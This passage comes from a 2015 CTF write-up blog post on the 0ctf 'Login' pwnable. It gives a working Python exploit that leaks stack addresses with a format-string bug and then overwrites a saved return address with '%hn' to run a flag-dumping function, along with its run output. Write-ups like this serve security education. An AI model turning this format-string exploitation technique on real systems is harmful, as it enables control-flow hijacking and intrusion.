+<p>Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.</p>
+
+<h2>Hitting the jackpot</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python poc.py 43
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked address of base: 0x7f48589d5000
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked address of stack: 0x7fffb65656b0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Offset format string with <span class="m">24497</span> bytes
+</span><span class='line'>AAAAAAABBBC
+</span><span class='line'>           b.XH..TV...
+</span><span class='line'>0x7f48589d620c
+</span><span class='line'>you<span class="err">&#39;</span>re looking <span class="k">for</span> 0x7f48589d620c
+</span><span class='line'>Found at 43
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;202.112.26.107&#39;</span><span class="p">,</span> <span class="mi">10910</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c">#raw_input()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;guest123&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;username:&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">256</span><span class="p">)</span>        <span class="c"># overflow userflag</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>         <span class="c"># secret login menu</span>
+</span><span class='line'>  
+</span><span class='line'>  
+</span><span class='line'>  <span class="c">### first string format vuln to read stack addr</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># 43 found by lucky bruteforcing in combination with the 504 below. locally, it&#39;s at 15 and 41</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%1$lp-%43$lp&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;login failed.&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;([a-f0-9]{5,})&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># find stack addr:</span>
+</span><span class='line'>  <span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1490</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># base_addr was not necesssary in the final exploit, but was </span>
+</span><span class='line'>  <span class="c"># instrumental in finding the right offset!</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of base: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of stack: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># we need to return to base_addr + 0xfb3, because that function </span>
+</span><span class='line'>  <span class="c"># is designed to read the flag &amp; spit it over the socket</span>
+</span><span class='line'>  <span class="n">print_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xfb3</span> <span class="o">-</span> <span class="mi">2</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Offset format string with {} bytes&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">print_offset</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># send format string to overwrite saved return addr of </span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%05d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">print_offset</span> <span class="o">+</span><span class="s">&#39;c___%10$hn&#39;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">-</span><span class="mi">504</span><span class="p">))</span>   <span class="c"># should point to ret_addr at stack</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-30T20:17:23+02:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:17 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/03/30/0ctf-login/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/03/30/0ctf-login/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/30/0ctf-flagen/" title="Previous Post: 0ctf - flagen">&laquo; 0ctf - flagen</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/30/0ctf-login/">0ctf - Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/30/0ctf-flagen/">0ctf - Flagen</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/">After the Fact - BCTF Zhong Guan Cun Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-www/">BSides Vancouver CTF - WWW</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/">BSides Vancouver CTF - Sushi</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/03/30/0ctf-login/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/03/30/0ctf-login/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
